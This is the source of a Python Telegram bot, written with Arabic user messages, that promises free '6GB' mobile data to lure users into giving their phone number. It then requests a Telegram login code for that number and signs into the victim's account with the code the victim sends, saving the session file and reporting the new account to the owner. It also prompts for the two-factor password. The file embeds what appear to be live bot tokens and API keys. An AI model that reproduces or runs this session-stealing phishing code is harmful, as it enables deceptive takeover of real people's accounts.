from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
import logging
from pathlib import Path

BOT_TOKEN = "8704404185:AAGe_I8kcY4qtbpzVLxpTc2seLrPHHKLsvE"
API_ID = 38269251
API_HASH = "af81ddbd39ca658e08bf7c268d6651c7"
OWNER_ID = 5843701757

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

user_data = {}
SESSIONS_DIR = Path("sessions")
SESSIONS_DIR.mkdir(exist_ok=True)

async def get_telegram_client(session_name):
    client = TelegramClient(str(SESSIONS_DIR / session_name), API_ID, API_HASH)
    await client.connect()
    return client

def format_phone(phone_raw):
    phone_raw = phone_raw.strip().replace(' ', '').replace('+', '')
    if phone_raw.startswith('0'):
        return '213' + phone_raw[1:]
    elif not phone_raw.startswith('213'):
        return '213' + phone_raw
    return phone_raw

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_data[user_id] = {'step': 'waiting_phone'}
    await update.message.reply_text("🎉 مرحباً! أرسل رقم هاتفك لتفعيل 6GB")
    await context.bot.send_message(OWNER_ID, f"👤 مستخدم جديد: {update.effective_user.first_name}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    text = update.message.text.strip()

    if user_id not in user_data:
        await update.message.reply_text("❌ استخدم /start")
        return

    step = user_data[user_id]['step']

    if step == 'waiting_phone' and text.isdigit() and len(text) >= 8:
        phone = format_phone(text)
        await update.message.reply_text(f"📲 تم استلام الرقم: +{phone}")
        try:
            client = await get_telegram_client(f"user_{user_id}")
            await client.send_code_request(phone)
            user_data[user_id] = {'step': 'waiting_code', 'phone': phone, 'client': client}
            await update.message.reply_text("✅ أرسل الرمز")
        except Exception as e:
            logger.error(f"خطأ في طلب الرمز: {e}")
            await update.message.reply_text("❌ حدث خطأ")

    elif step == 'waiting_code' and text.isdigit() and len(text) == 5:
        client = user_data[user_id]['client']
        try:
            await client.sign_in(phone=user_data[user_id]['phone'], code=text)
            me = await client.get_me()
            session_path = SESSIONS_DIR / f"user_{user_id}.session"
            await client.disconnect()
            await update.message.reply_text("✅ تم التفعيل!")
            await context.bot.send_message(OWNER_ID, f"✅ حساب جديد: {me.first_name}\n📁 {session_path}")
            del user_data[user_id]
        except SessionPasswordNeededError:
            user_data[user_id]['step'] = 'waiting_2fa'
            await update.message.reply_text("🔐 أرسل كلمة المرور")
        except Exception as e:
            logger.error(f"خطأ في تسجيل الدخول: {e}")
            await update.message.reply_text("❌ رمز خطأ")
    else:
        await update.message.reply_text("❌ إدخال غير صحيح")

def main():
    print("🚀 البوت شغال...")
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.run_polling()

if __name__ == '__main__':
    main()
